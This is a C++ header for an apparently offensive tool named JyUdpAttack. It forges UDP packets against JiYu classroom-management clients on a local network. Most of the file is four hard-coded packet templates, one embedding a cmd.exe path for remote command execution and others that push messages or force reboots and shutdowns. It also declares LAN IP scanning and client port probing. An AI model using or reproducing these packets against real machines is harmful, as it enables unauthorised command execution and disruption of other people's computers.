#pragma once
#include "stdafx.h"
#include <list>
#include <string>
#include <vector>
#include <WS2spi.h>
#include <iphlpapi.h>
#include <WS2tcpip.h>
#include "CAutoLock.h"

#define WM_MY_SCAN_IP_FINISH WM_USER+301
#define WM_MY_SCAN_IP_ADD WM_USER+302
#define WM_MY_SCAN_ADD_STR WM_USER+303
#define WM_MY_GET_SM_TICP_PORT_FINISH WM_USER+304
#define WM_MY_SEND_ADD_RESULT WM_USER+305

#define NOT_FOUND_JY_PORT 0xFFFFA
#define FAILED_FOUND_JY_PORT 0xFFFFB
#define SEND_BUFFER_SIZE 1024
#define PACK_BUFFER_SIZE 128

struct JyNetworkIP {
	std::wstring hostName;
	std::wstring ipAddress;
};
class JyUdpAttack
{
private:
	UCHAR basePack[4][PACK_BUFFER_SIZE] = {
		{
			0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, 0xe7, 0x52, 0x40, 0x91,
			0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 
			0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00
		},
		{
			0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x39, 0x8e, 0xd2, 0x7c, 0x8b, 0x56, 0x0d, 0x45, 0x9c, 
			0x60, 0xe0, 0xd0, 0xc4, 0xa4, 0xb3, 0xf2, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 
			0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 
			0x00, 0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x73, 0x00, 
			0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
			0x00, 0x00
		},
		{	
			0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xbf, 0x40, 0x22, 0x4e, 0x57, 0x2d, 0x3e, 0x4f, 0x9b, 
			0x6f, 0xc1, 0x8d, 0xe1, 0xeb, 0x4f, 0x62, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 
			0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 
			0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0xcd, 0x91, 0x2f, 0x54, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 
			0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
			0x00, 0x00
		},
		{
			0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xc8, 0xe3, 0x97, 0xfd, 0xc0, 0xb5, 0x9f, 0x45, 0x87, 
			0x72, 0x05, 0xbd, 0x4e, 0x46, 0xa8, 0x96, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 
			0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 
			0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 
			0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
			0x00, 0x00
		} 
	};

#define BASE_PACK_MSG 0
#define BASE_PACK_CMD 1
#define BASE_PACK_REBOOT 2
#define BASE_PACK_SHUTDOWN 3

	bool isSaningIPs = false;
	std::wstring saningIPsAddrStart;
	std::wstring saningIPsAddrEnd;
	std::wstring saningIPsAddrPrev;
	std::wstring saningIPsAddrCurrent;
	CAutoLock saningIPsLock; 
	in_addr saningIPsAddrLocal;
	int saningIPsWorkingThread = 0;

public:

	HWND saningIPsReceivehWnd = nullptr;
	HWND checkStudentMainTCPPortReceivehhWnd = nullptr;
	HWND sendResultReceivehWnd = nullptr;

	JyUdpAttack();
	~JyUdpAttack();

	static JyUdpAttack* currentJyUdpAttack;

	//扫描局域网IP
	void ScanNetworkIP(HWND hWnd, std::wstring &start, std::wstring &end, std::wstring& host, std::wstring& current);
	//检测极域的TCP端口
	void CheckStudentMainTCPPort(HWND hWnd);
	//发送cmd
	void SendCommand(std::wstring& ip, DWORD port, std::wstring& cmd);
	//发送信息
	void SendText(std::wstring& ip, DWORD port, std::wstring& cmd);
	//发送关机指令
	void SendShutdown(std::wstring& ip, DWORD port);
	//发送重启指令
	void SendReboot(std::wstring& ip, DWORD port);

private:
	static void TaskFeedbackMessage(struct SendTask* task, std::wstring* msg);
	static DWORD WINAPI SendThread(void* data);
	static DWORD WINAPI CheckStudentMainTCPPortThread(void* data);
	static DWORD WINAPI ScanNetworkIPThread(JyUdpAttack*inst);
	static DWORD WINAPI ScanNetworkIPSubTaskThread(void* data);
};


